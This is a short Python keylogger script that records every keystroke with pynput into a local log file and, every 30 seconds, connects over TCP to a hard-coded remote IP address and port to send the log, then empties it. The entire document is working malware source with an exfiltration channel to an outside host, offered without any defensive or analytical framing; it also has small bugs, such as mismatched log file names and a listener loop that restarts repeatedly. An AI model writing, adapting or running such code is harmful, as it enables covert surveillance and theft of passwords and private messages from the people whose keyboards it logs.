from pynput.keyboard import Listener
import socket
import threading
import time
SERVER = '100.84.214.6'
PORT = 9090

listener_active = False

#SOCKETS
def send_message(FilePath):
    global listener_active
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER, PORT))
        start_connection = "Connection started"
        s.sendall(start_connection.encode('utf-8'))

        response = s.recv(1024)
        print(f"Server response: {response.decode('utf-8')}")
        if response.decode('utf-8') == 'restart_listener':
            listener_active = False

        with open(FilePath, 'r') as file:
            contents = file.read()
            s.sendall(contents.encode('utf-8'))
    print('File sent Successfully')


#keylogger key
def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(str(key) + '\n')

#keylogger
def keyboard_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

def start_listiner():
    global listener_active
    listener_thread = threading.Thread(target=keyboard_listener)
    listener_thread.start()
    listener_active = False

while True:
    if not listener_active:
        start_listiner()
        time.sleep(30)
        send_message('Log.txt')
        open('Log.txt', 'w').close()
